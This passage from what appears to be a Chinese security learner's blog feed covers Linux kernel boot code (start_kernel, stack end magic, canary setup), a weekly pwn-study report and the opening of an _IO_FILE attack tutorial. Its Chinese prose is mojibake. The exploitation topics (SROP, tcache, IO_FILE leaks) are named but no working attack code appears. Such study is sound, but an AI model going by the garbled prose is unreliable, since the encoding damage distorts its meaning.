panic_param);</span><br><span class="line"></span><br><span class="line">lockdep_info();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Need to run this when irqs are enabled, because it wants</span></span><br><span class="line"><span class="comment"> * to self-test [hard/soft]-irqs on/off lock inversion bugs</span></span><br><span class="line"><span class="comment"> * too:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">locking_selftest();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_BLK_DEV_INITRD</span></span><br><span class="line"><span class="keyword">if</span> (initrd_start &amp;&amp; !initrd_below_start_ok &amp;&amp;</span><br><span class="line">    page_to_pfn(virt_to_page((<span class="keyword">void</span> *)initrd_start)) &lt; min_low_pfn) &#123;</span><br><span class="line">pr_crit(<span class="string">&quot;initrd overwritten (0x%08lx &lt; 0x%08lx) - disabling it.\n&quot;</span>,</span><br><span class="line">    page_to_pfn(virt_to_page((<span class="keyword">void</span> *)initrd_start)),</span><br><span class="line">    min_low_pfn);</span><br><span class="line">initrd_start = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">page_cgroup_init();</span><br><span class="line">debug_objects_mem_init();</span><br><span class="line">kmemleak_init();</span><br><span class="line">setup_per_cpu_pageset();</span><br><span class="line">numa_policy_init();</span><br><span class="line"><span class="keyword">if</span> (late_time_init)</span><br><span class="line">late_time_init();</span><br><span class="line">sched_clock_init();</span><br><span class="line">calibrate_delay();</span><br><span class="line">pidmap_init();</span><br><span class="line">anon_vma_init();</span><br><span class="line">acpi_early_init();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86</span></span><br><span class="line"><span class="keyword">if</span> (efi_enabled(EFI_RUNTIME_SERVICES))</span><br><span class="line">efi_enter_virtual_mode();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_ESPFIX64</span></span><br><span class="line"><span class="comment">/* Should be run before the first non-init thread is created */</span></span><br><span class="line">init_espfix_bsp();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">thread_info_cache_init();</span><br><span class="line">cred_init();</span><br><span class="line">fork_init(totalram_pages);</span><br><span class="line">proc_caches_init();</span><br><span class="line">buffer_init();</span><br><span class="line">key_init();</span><br><span class="line">security_init();</span><br><span class="line">dbg_late_init();</span><br><span class="line">vfs_caches_init(totalram_pages);</span><br><span class="line">signals_init();</span><br><span class="line"><span class="comment">/* rootfs populating might need page-writeback */</span></span><br><span class="line">page_writeback_init();</span><br><span class="line">proc_root_init();</span><br><span class="line">cgroup_init();</span><br><span class="line">cpuset_init();</span><br><span class="line">taskstats_init_early();</span><br><span class="line">delayacct_init();</span><br><span class="line"></span><br><span class="line">check_bugs();</span><br><span class="line"></span><br><span class="line">sfi_init_late();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (efi_enabled(EFI_RUNTIME_SERVICES)) &#123;</span><br><span class="line">efi_late_init();</span><br><span class="line">efi_free_boot_services();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ftrace_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Do the rest non-__init&#x27;ed, we&#x27;re now alive */</span></span><br><span class="line">rest_init();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>start_kernel</code>å¤„ä¸‹æ–­ç‚¹ä¹‹å<code>c</code>å°±æ–­ä¸‹æ¥äº†ï¼Œå¯ä»¥ä»<code>pwngdb</code>é‡Œé¢çœ‹åˆ°æ­¤æ—¶çš„å †æ ˆå·²ç»åˆå§‹åŒ–å¥½äº†ï¼Œè¿™é‡Œåº”è¯¥æ˜¯è¿›ç¨‹å†…æ ¸æ ˆï¼š</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/5.jpg" class=""><p>æœ€æœ€æœ€å¼€å§‹çš„éƒ¨åˆ†å°±æ˜¯ä¸‹é¢è¿™ä¸ªéƒ¨åˆ†ï¼Œå½“æˆ‘è¿›å…¥çš„æ—¶å€™<code>lockdep_init()</code>å·²ç»å®Œæˆäº†ï¼Œæˆ‘ä¸ä¿¡é‚ªï¼Œé‡æ–°å¼€å§‹æƒ³è¦å†å®ƒé‚£ä¸‹æ–­ç‚¹ï¼Œå‘ç°å®ƒå¹¶æ²¡æœ‰<code>lockdep_init</code>è¿™ä¸ªç¬¦å·ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lockdep_init();</span><br><span class="line">set_task_stack_end_magic(&amp;init_task);</span><br></pre></td></tr></table></figure><p>ç®€å•çœ‹ä¸€ä¸‹å®ƒçš„æºç ï¼Œé¦–å…ˆæ£€æŸ¥<code>lockdep_init</code>æ˜¯å¦è¢«åˆå§‹åŒ–è¿‡ï¼ˆå®ƒåªéœ€è¦åˆå§‹åŒ–ä¸€æ¬¡ï¼‰ï¼Œä¹‹åå°±æ˜¯ç”Ÿæˆäº†ä¸¤ä¸ªå“ˆå¸Œçš„é“¾è¡¨ï¼Œæ’å…¥è‡ªå·±çš„ä¸€ä¸ªæƒ³æ³•ï¼šå¦‚æœå®ƒæ²¡æœ‰æ£€æŸ¥<code>lockdep_init</code>æ˜¯å¦è¢«åˆå§‹åŒ–ï¼Œæ˜¯ä¸æ˜¯å¯ä»¥å†ä¸€æ¬¡è¿›è¡Œåˆå§‹åŒ–ç„¶åæ§åˆ¶æˆ‘ä»¬çš„è¿™ä¸ªé“¾è¡¨ä¸Šå†…å®¹è¿›è¡Œä¸€ä¸‹ä¼ªé€ å‘¢ï¼Ÿï¼ˆçªå‘å¥‡æƒ³ï¼Œå¤§å¸ˆå‚…è«æ€ªï¼‰ï¼Œå…³äºæ­»é”æ£€æµ‹çš„åŸç†çœ‹ä¸‹é¢çš„æ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/faxiang1230/article/details/105223966/">æ­»é”æ£€æµ‹lockdepå®ç°åŸç†</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lockdep_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lockdep_initialized)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; CLASSHASH_SIZE; i++)</span><br><span class="line">    INIT_LIST_HEAD(classhash_table + i);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; CHAINHASH_SIZE; i++)</span><br><span class="line">    INIT_LIST_HEAD(chainhash_table + i);</span><br><span class="line"></span><br><span class="line">    lockdep_initialized = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨æºç ä¸­ä¼šæœ‰<code>Need to run as early as possible, to initialize the lockdep hash</code>è¿™æ¡æ³¨é‡Šï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯è¯´<code>lockdep_init</code>éœ€è¦å°½å¯èƒ½çš„æœ€æ—©è¿è¡Œï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿå…¶å®å¾€ä¸‹çœ‹ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼ˆ<code>set_task_stack_end_magic(&amp;init_task)</code>ï¼‰å°±çŸ¥é“äº†ï¼Œæ­¥å…¥ä¹‹åå®ƒå°±å»<code>fork.c</code>äº†ï¼Œå›è¿‡å¤´çœ‹å®ƒåˆå§‹åŒ–æ­»é”ä¹Ÿæ˜¯æŒºæœ‰é“ç†çš„ï¼Œå›å¤´æƒ³æƒ³è¿™å²‚ä¸æ˜¯ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼Ÿç­”æ¡ˆç¡®å®æ˜¯çš„ï¼</p><blockquote><p>å¯ä»¥çœ‹å‡º<code> init_task</code>ï¼ˆ0 å·è¿›ç¨‹ï¼‰æ˜¯<code>task_struct</code>ç±»å‹ï¼Œæ˜¯è¿›ç¨‹æè¿°ç¬¦ï¼Œ ä½¿ç”¨å® INIT_TASK å¯¹å…¶è¿›è¡Œåˆå§‹åŒ–ã€‚</p></blockquote><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/6.png" class="" width="6"><p>åˆšå¼€å§‹çœ‹çœ‹å®ƒçš„æºç ä¹Ÿæ˜¯æŒºå¥‡æ€ªçš„ï¼Œå®ƒçš„ç›®çš„æ˜¯é˜²æ­¢æº¢å‡ºï¼Ÿå®ƒåœ¨<code>stack</code>çš„æœ«å°¾æ”¾äº†ä¸€ä¸ª<code>STACK_END_MAGIC</code>çš„æ ‡å¿—ï¼Œæ ˆæº¢å‡ºä¸æ˜¯æœ‰<code>canary</code>æ¥ä¿æŠ¤å—ï¼Œä¸ºä»€ä¹ˆè¦ä¸¤ä¸ªç©æ„å„¿æ¥ä¿æŠ¤ï¼Œå…¶å®è¿™ä¸¤ä¸ªæœ‰ç€æœ¬è´¨çš„åŒºåˆ«ï¼Œ<code>canary</code>æ˜¯ä¿æŠ¤è¿”å›åœ°å€ä¸è¢«è¦†ç›–ï¼Œè€Œæ­¤å¤„çš„<code>STACK_END_MAGIC</code>æ˜¯ä¿æŠ¤æ ˆçš„åº•éƒ¨ï¼Œé˜²æ­¢æœ‰äº›æ¶æ„çš„æ•°æ®å‘å†…å­˜ä¸­çš„å…¶ä»–åœ°æ–¹è”“å»¶ï¼Œæ­¤å¤„ä¹Ÿè¯æ˜äº†å®ƒå†è¿›å…¥<code>start_kernel</code>çš„æ—¶å€™å·²ç»åˆå§‹åŒ–å¥½äº†æ ˆï¼š</p><p><a href="https://blog.csdn.net/qq_41957544/article/details/117965729">start_kernel åˆ†æ â€”â€” set_task_stack_end_magic</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_END_MAGIC0x57AC6E9D</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_task_stack_end_magic</span><span class="params">(struct task_struct *tsk)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *stackend;</span><br><span class="line">    </span><br><span class="line">    stackend = end_of_stack(tsk);</span><br><span class="line">    *stackend = STACK_END_MAGIC;<span class="comment">/* for overflow detection */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ‰æ˜¯<code>canary</code>çš„åˆå§‹åŒ–ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">boot_init_stack_canary();</span><br></pre></td></tr></table></figure><p>ç†Ÿæ‚‰<code>PWN</code>çš„é€‰æ‰‹å¯¹äº<code>canary</code>å¯èƒ½éƒ½ä¸ä¼šå¤ªé™Œç”Ÿï¼Œè¿™é‡Œå°±ç¨å¾®ä»‹ç»ä¸€ä¸‹ï¼Œåˆ©ç”¨<code>random+tsc</code>çš„æ¨¡å¼æ¥ç”Ÿæˆéšæœºæ•°ï¼Œä¸ºå•¥è¦ç”¨ä¸¤ä¸ªæ¥ç”Ÿæˆå‘¢ï¼Ÿç­”æ¡ˆå¾ˆæ˜æ˜¾å°±æ˜¯å¢åŠ éšæœºæ€§å˜›ï¼ç„¶åå†™å…¥åˆ°<code>idle</code>è¿›ç¨‹çš„<code>task_struct-&gt;stack_canary</code>ä¸­é‡Œé¢ï¼ˆè¿™ä¸ªæ˜¯å•¥ç­‰ä¼šå†è¯´ï¼‰ï¼ŒåŒæ—¶è¿˜å¾—å†™åˆ°<code>CPU</code>é‡Œé¢å»ï¼š</p><p><a href="https://blog.csdn.net/sahusoft/article/details/7866536">æ—¶é—´æˆ³è®¡æ•°å™¨ TSC</a></p><p><a href="https://www.cnblogs.com/bigship/archive/2010/04/04/1704228.html">ä»Linuxå†…æ ¸ä¸­è·å–çœŸéšæœºæ•°</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> <span class="title">boot_init_stack_canary</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    u64 canary;</span><br><span class="line">    u64 tsc;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">    BUILD_BUG_ON(offsetof(<span class="keyword">union</span> irq_stack_union, stack_canary) != <span class="number">40</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    get_random_bytes(&amp;canary, <span class="keyword">sizeof</span>(canary));</span><br><span class="line">    tsc = __native_read_tsc();</span><br><span class="line">    canary += tsc + (tsc &lt;&lt; <span class="number">32UL</span>);</span><br><span class="line"></span><br><span class="line">    current-&gt;stack_canary = canary;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_X86_64</span></span><br><span class="line">    this_cpu_write(irq_stack_union.stack_canary, canary);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    this_cpu_write(stack_canary.canary, canary);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cgroup</code>ä¸ºè¿›ç¨‹çš„è¡Œä¸ºæ§åˆ¶ï¼Œ<code>cgroup_init_early</code>åšæ•°æ®ç»“æ„å’Œå…¶ä¸­é“¾è¡¨çš„åˆå§‹åŒ–ï¼Œæœ‰ä¸ªåšä¸»å†™çš„å¤Ÿè¯¦ç»†äº†ï¼š</p><p><a href="https://blog.csdn.net/u011370207/article/details/80236674">ä»cgroup_init_earlyå‡½æ•°å­¦ä¹ cgroupâ€”â€”åˆå§‹åŒ–ä»£ç </a></p><p><a href="https://blog.csdn.net/u011370207/article/details/80235698">ä»cgroup_init_earlyå‡½æ•°å­¦ä¹ cgroupâ€”â€”æ¡†æ¶</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cgroup_init_early();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">local_irq_disable();</span><br><span class="line">local_irq_enable();</span><br></pre></td></tr></table></figure><p><code>boot_cpu_init</code>æ˜¯å»å¯åŠ¨<code>boot CPU</code>çš„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __init <span class="title">boot_cpu_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> cpu = smp_processor_id();</span><br><span class="line">    <span class="comment">/* Mark the boot cpu &quot;present&quot;, &quot;online&quot; etc for SMP and UP case */</span></span><br><span class="line">    set_cpu_online(cpu, <span class="literal">true</span>);</span><br><span class="line">    set_cpu_active(cpu, <span class="literal">true</span>);</span><br><span class="line">    set_cpu_present(cpu, <span class="literal">true</span>);</span><br><span class="line">    set_cpu_possible(cpu, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setup_arch(&amp;command_line);</span><br><span class="line">mm_init_cpumask(&amp;init_mm);</span><br><span class="line">setup_command_line(command_line);</span><br><span class="line">setup_nr_cpu_ids();</span><br><span class="line">setup_per_cpu_areas();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å†…æ ¸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…æ ¸ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åæœˆå‘¨æŠ¥ï¼ˆä¸€ï¼‰</title>
      <link href="/2021/10/12/%E5%8D%81%E6%9C%88%E5%91%A8%E6%8A%A5%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/10/12/%E5%8D%81%E6%9C%88%E5%91%A8%E6%8A%A5%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<blockquote><p>â€‹        ä»è¿™ä¸ªæœˆèµ·ï¼Œå‘¨æœ«æ‚è´§é“ºæ­£å¼å¼€å¼ ï¼ç”±äºè½åçš„å¤ªå¤šéœ€è¦è·‘çš„æ›´å¿«æ‰èƒ½èµ¶ä¸Šåˆ«äººï¼Œæ‰€ä»¥å¼€å§‹å†™å‘¨æŠ¥è®¡åˆ’ä¸€ä¸‹ï¼Œå›é¡¾ä¸Šå‘¨å­¦ä¹ è¿‡çš„çŸ¥è¯†ä»¥åŠæ¥ä¸‹æ¥éœ€è¦å­¦ä¹ çš„çŸ¥è¯†ï¼Œåšå‘¨æŠ¥çœŸæ»´å¯ä»¥æå‡å­¦ä¹ çš„æ•ˆç‡ï¼ŒåŒæ—¶åšå‘¨æŠ¥ä¹Ÿæ˜¯ä»¶æŒºå¿«ä¹çš„ä¸€ä»¶äº‹ï¼ˆ<code>Ã—</code>æ°´æ–‡ç« </p></blockquote><h3 id="ä¸Šå‘¨å­¦ä¹ å›é¡¾ï¼š"><a href="#ä¸Šå‘¨å­¦ä¹ å›é¡¾ï¼š" class="headerlink" title="ä¸Šå‘¨å­¦ä¹ å›é¡¾ï¼š"></a>ä¸Šå‘¨å­¦ä¹ å›é¡¾ï¼š</h3><p>å­¦ä¹ å†…å®¹ï¼š</p><ul><li>å¤ä¹ <code>SROP+orw</code>çš„åŸºæœ¬æ“ä½œä¸æ‰‹æ³•ï¼Œä¹‹å‰å¯¹<code>SROP</code>è¿˜æœ‰ç‚¹æ‡µæ‡µæ‡‚æ‡‚ï¼Œä¸€ç›´æä¸æ¸…æ¥šå®ƒåˆ°åº•æ˜¯æ€ä¹ˆæ ·åŠ«æŒæ§åˆ¶æµçš„ï¼Œå…¶å®å°±æ˜¯åœ¨æ ˆä¸Šçš„å¯¹åº”çš„<code>RIP</code>å¯„å­˜å™¨ä¸Šå†™ä¸Šè¦è·³è½¬çš„åœ°æ–¹å³å¯ï¼ˆå½“æ—¶å¯èƒ½å¤ªæµ®èºæ²¡å¤ªæ³¨æ„â€¦.</li><li>ä¸€ç›´ä»¥æ¥éƒ½å¯¹<code>tache bin attack</code>å¾ˆææ…Œï¼Œè§‰å¾—<code>tache</code>è¿™ä¸ªæ–°å¥‡ç©æ„æœ‰ç‚¹å¥‡æ€ªï¼Œä½†çœŸæ­£é™ä¸‹å¿ƒæ¥çœ‹çœ‹å®ƒçš„æ”»å‡»æ‰‹æ³•ä¹‹åå¹¶æ²¡æœ‰è¿™ä¹ˆçš„å›°éš¾</li><li>åŒæ ·ä¹Ÿæ˜¯å¯¹<code>IO_FILE</code>å¤æ‚çš„ç»“æ„ç»™å“åˆ°äº†ï¼Œè¿™å‘¨ç»ˆäºæŠŠå®ƒç»™æå®šäº†ï¼ä»å¤´åˆ°å°¾éƒ½çœ‹äº†çœ‹åˆ†æäº†ä¸€ä¸‹ï¼Œå¯¹<code>IO_FILE</code>æ³„éœ²åœ°å€ä¹Ÿæ‡‚ä¸ºå•¥<code>payload</code>è¦é‚£æ ·å†™äº†ï¼</li><li>åšäº†ä¸€ä¸‹ä¸²å£æ‹¿<code>shell</code>çš„å®éªŒï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æˆåŠŸï¼ŒåŸå› ä¸è¯¦  ã„’oã„’ï¼ï¼ï¼</li></ul><p><code>get</code>åˆ°çš„å°<code>tips</code>ï¼š</p><ul><li><p>ä¿æŠ¤å…¨å¼€å¦‚ä½•æŸ¥çœ‹<code>.bss</code>æ®µå†…å®¹ï¼š<code>vmmap</code>çœ‹åŸºåœ°å€åŠ ä¸Š<code>ida</code>é‡Œé¢çš„åç§»å³å¯</p></li><li><p>æ³¨æ„<code>ebp</code>æœ‰å¯èƒ½æ˜¯ä¸€æ¡æ±‡ç¼–ä»£ç ï¼Œæº¢å‡ºçš„æ—¶å€™æ³¨æ„è¦å¤åŸï¼ˆä¸€èˆ¬éƒ½å¯ä»¥æ³„éœ²ï¼‰</p></li><li><p>å‘ç°<a href="https://elixir.bootlin.com/linux/latest/source">linuxå†…æ ¸æºç é˜…è¯»</a>çš„ç½‘å€ï¼Œå•¥ç‰ˆæœ¬éƒ½æœ‰ï¼Œæœ‰ç‚¹ç‰›ï¼</p><p>â€”â€”â€”-<em>ä¸Šå‘¨è®¡åˆ’æ˜¯å¦å®Œæˆï¼šå®Œæˆå¤§éƒ¨åˆ†</em></p></li></ul><h3 id="ä¸‹å‘¨å­¦ä¹ è®¡åˆ’"><a href="#ä¸‹å‘¨å­¦ä¹ è®¡åˆ’" class="headerlink" title="ä¸‹å‘¨å­¦ä¹ è®¡åˆ’"></a>ä¸‹å‘¨å­¦ä¹ è®¡åˆ’</h3><ul><li>é˜…è¯»ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ã€‹ç†è§£ä¸€äº›<code>linux</code>æ“ä½œç³»ç»Ÿçš„çŸ¥è¯†</li><li>åŠ æ·±å¯¹<code>IO_FILE</code>çš„ç†è§£</li><li>å°è¯•åœ¨<code>telnet</code>é‡Œé¢æ‰“åŒ…æ–‡ä»¶ç³»ç»Ÿ</li><li>æœ‰æ—¶é—´å»ºè®®å¤ç°ä¸€ä¸ªCVEï¼ˆqemuæ¨¡æ‹Ÿæˆ–è€…æ˜¯WR-TL841Nï¼ˆå®ƒåˆ°äº†çš„è¯ï¼‰ï¼‰</li><li>é˜…è¯»ã€Šåº–ä¸è§£ç‰›linuxå†…æ ¸ã€‹å°è¯•è°ƒè¯•å†…æ ¸ä»£ç </li></ul><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>â€‹        è¿™å‘¨çš„å­¦ä¹ è¿›åº¦åˆæ…¢äº†ä¸‹æ¥ï¼Œå°±ä¸çŸ¥é“å­¦å•¥äº†ï¼Œè¿˜æ˜¯å¤šæ‰“ç‚¹æ¯”èµ›ï¼Œä»¥èµ›ä»£ç»ƒï¼Œåœ¨æ¯”èµ›ä¸­æŸ¥ç¼ºè¡¥æ¼ï¼Œå°±å¥½åƒåœ¨é¹¤åŸä¸­ï¼Œæœ‰é¢˜çœŸå°±ç™½ç»™é¢˜å±…ç„¶æ²¡åšå‡ºæ¥â€¦.è¿˜å¾—å†é™ä¸‹å¿ƒæ¥ï¼ŒåŠ å¿«ç‚¹è„šæ­¥æ‰è¡Œï¼</p>]]></content>
      
      
      <categories>
          
          <category> ä¼ è¯´ä¸­çš„å°æŠ¥å‘Šä¹‹å‘¨æŠ¥ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‘¨æŠ¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>_IO_FILEæ”»å‡»</title>
      <link href="/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/"/>
      <url>/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>_IO_FILE</code>æ”»å‡»ä»<code>exp</code>ä¸­æ¥çœ‹å¾ˆç®€å•ï¼Œä½†å…¶èƒŒåçš„å«æœ‰å¹¶ä¸ç®€å•ï¼Œå¯ä»¥ç”¨å¤æ‚æ¥å½¢å®¹ï¼Œä¹Ÿå¾ˆæ¨¡æ¿åŒ–ï¼Œåœ¨æ¯”èµ›ä¸­æœ‰å‡ ç§æ¯”è¾ƒå¸¸è§çš„å½¢å¼ï¼Œé™¤äº†<code>House of orange</code>ï¼Œè¿˜æœ‰ç”¨å®ƒæ¥æ³„éœ²<code>libc</code>åœ°å€ï¼ˆæ­¤æ–‡ç« é‡ç‚¹è®²è§£ï¼‰ï¼Œæ¥ä¸‹æ¥ä¸€èµ·æ¥çœ‹çœ‹ï¼ŒåŠ¨æ‰‹è°ƒä¸€è°ƒï¼Œç»™è‡ªå·±ç•™ä¸ªæ·±åˆ»çš„å°è±¡</p></blockquote><h4 id="IO-FILEåˆ°åº•æ˜¯ä¸ªå•¥ï¼Ÿ"><a href="#IO-FILEåˆ°åº•æ˜¯ä¸ªå•¥ï¼Ÿ" class="headerlink" title="_IO_FILEåˆ°åº•æ˜¯ä¸ªå•¥ï¼Ÿ"></a>_IO_FILEåˆ°åº•æ˜¯ä¸ªå•¥ï¼Ÿ</h4><p>åœ¨ä¸€å¼€å§‹æ¥è§¦è¿™ä¸ªä¸œè¥¿çš„æ—¶å€™ï¼ŒçœŸçš„æ˜¯ä¸€å¤´é›¾æ°´ï¼Œå„ç§ç»“æ„ä½“ï¼Œæ™•å¤´è½¬å‘ï¼Œå…¶å®IO_FILEçš„æœ¬è´¨å°±æ˜¯ä¸‰ä¸ªåŸºæœ¬çš„æ–‡ä»¶æµï¼Œ<code>stdinã€stdoutã€stderr</code>ï¼Œè¿™ä¸‰ä¸ªä¸œè¥¿æˆ‘ä»¬åº”è¯¥å¾ˆå¸¸è§ï¼Œæ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å‡ºï¼Œæ ‡å‡†é”™è¯¯ï¼Œåœ¨ç¨‹åºåˆå§‹åŒ–çš„æ—¶å€™å°±å·²ç»é»˜è®¤ç”Ÿæˆå¥½äº†ï¼Œæ‰€ä»¥åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å†æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶æµçš„<code>fd</code>ä¸º<code>3</code>ï¼Œé‚£ä¹ˆè¿™äº›æ–‡ä»¶æµæ˜¯é€šè¿‡ä»€ä¹ˆæ¥ç´¢å¼•çš„å‘¢ï¼Ÿç­”ï¼š<code>IO_list_all</code>ä¼šé€šè¿‡å•é¡¹åˆ—è¡¨ä¿å­˜æ‰€æœ‰çš„æ–‡ä»¶æµï¼š</p><img src="/2021/10/10/IO-FILE%E6%94%BB%E5%87%BB/1.png" class=""><p><code>_IO_FILE</code>çš„æºç åœ¨<code>/usr/include/x86_64-linux-gnu/bits/libio.h</code>æˆ–è€…<code>libio/libio.h</code>ï¼Œå¯ä»¥å»çœ‹çœ‹ï¼Œé‡Œé¢æœ‰å„ç§å„æ ·çš„IOå‡½æ•°ï¼Œä½†æˆ‘ä»¬åªå…³æ³¨<code>_IO_FILE</code>ç›¸å…³çš„å‡½æ•°ï¼Œä¸‹é¢æ˜¯<code>_IO_FILE</code>çš„å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span 